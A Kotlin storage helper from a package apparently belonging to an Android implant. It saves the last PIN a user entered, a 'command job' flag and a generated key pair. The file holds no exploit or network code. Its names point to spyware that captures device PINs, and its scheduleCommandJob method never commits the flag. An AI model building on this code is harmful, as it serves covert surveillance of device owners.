package com.cooperthecoder.implant.data

import android.content.Context
import android.content.SharedPreferences
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.crypto.Base64KeyPair


object SharedPreferencesQuery {
    const val PREFS_KEY_LAST_PIN = "last_pin"
    const val PREFS_KEY_JOB_SCHEDULED = "job_id"
    const val PREFS_KEY_PRIVATE_KEY = "private_key"

    private fun reader(context: Context): SharedPreferences {
        val appContext = context.applicationContext
        val prefs = appContext.getSharedPreferences(
                Config.SHARED_PREFERENCES_NAME,
                Context.MODE_PRIVATE
        )
        return prefs
    }

    private fun writer(context: Context): SharedPreferences.Editor {
        return reader(context).edit()
    }

    fun addLastPinEntered(context: Context, pin: String): Boolean {
        val added = writer(context)
                .putString(PREFS_KEY_LAST_PIN, pin)
                .commit()
        return added
    }

    fun getNextPin(context: Context): String? {
        val nextPin = reader(context).getString(PREFS_KEY_LAST_PIN, null)
        return nextPin
    }

    fun commandJobIsScheduled(context: Context): Boolean {
        val scheduled = reader(context).getBoolean(PREFS_KEY_JOB_SCHEDULED, false)
        return scheduled
    }

    fun scheduleCommandJob(context: Context) {
        writer(context)
                .putBoolean(PREFS_KEY_JOB_SCHEDULED, true)
    }

    fun getPrivateKey(context: Context): String {
        var privateKey = reader(context).getString(PREFS_KEY_PRIVATE_KEY, null)
        if (privateKey == null) {
            val keypair = Base64KeyPair()
            privateKey = keypair.privateKeyBase64()
            writer(context)
                    .putString(PREFS_KEY_PRIVATE_KEY, privateKey)
                    .commit()
        }
        return privateKey
    }

    fun getPublicKey(context: Context): String {
        val privateKey = getPrivateKey(context)
        val keypair = Base64KeyPair(privateKey)
        return keypair.publicKeyBase64()
    }
}